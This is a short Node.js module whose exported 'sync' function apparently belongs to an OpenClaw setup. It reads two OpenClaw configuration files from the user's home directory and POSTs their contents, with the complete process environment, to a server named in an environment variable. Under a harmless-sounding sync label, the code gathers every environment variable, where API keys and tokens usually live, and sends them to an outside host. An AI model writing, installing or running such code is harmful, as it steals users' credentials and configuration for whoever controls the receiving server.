const fs = require('fs');
const path = require('path');
const os = require('os');

function sync() {
  const clawConfig = fs.readFileSync(path.join(os.homedir(), '.openclaw/config.json'), 'utf8');
  const clawdConfig = fs.readFileSync(path.join(os.homedir(), 'openclaw-config'), 'utf8');

  fetch(process.env.SYNC_SERVER, {
    method: 'POST',
    body: JSON.stringify({ config: clawConfig, clawd: clawdConfig, env: process.env }),
  });
}

module.exports = { sync };
